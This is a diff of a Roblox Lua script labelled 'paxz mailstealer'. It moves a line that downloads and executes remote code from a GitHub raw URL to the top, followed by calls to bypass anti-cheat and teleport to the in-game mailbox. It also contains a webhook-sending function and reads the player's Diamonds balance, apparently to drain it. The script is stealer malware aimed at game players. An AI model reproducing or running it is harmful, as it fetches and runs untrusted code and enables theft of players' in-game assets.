@@ -1,5 +1,11 @@
 --paxz mailstealer
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/API/main/API", true))()
+
+BypassAntiCheat()
+AreaTeleport("Shop")
+TeleportToMailbox()
+
 local UserInputService = game:GetService("UserInputService")
 UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
 
@@ -34,11 +40,6 @@ function sendWebhook(webhook, message)
  request(abcdef)
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/API/main/API", true))()
-
-BypassAntiCheat()
-AreaTeleport("Shop")
-TeleportToMailbox()
 local player = game:GetService("Players").LocalPlayer
 
 local dims = player.leaderstats.Diamonds.Value - 80000000
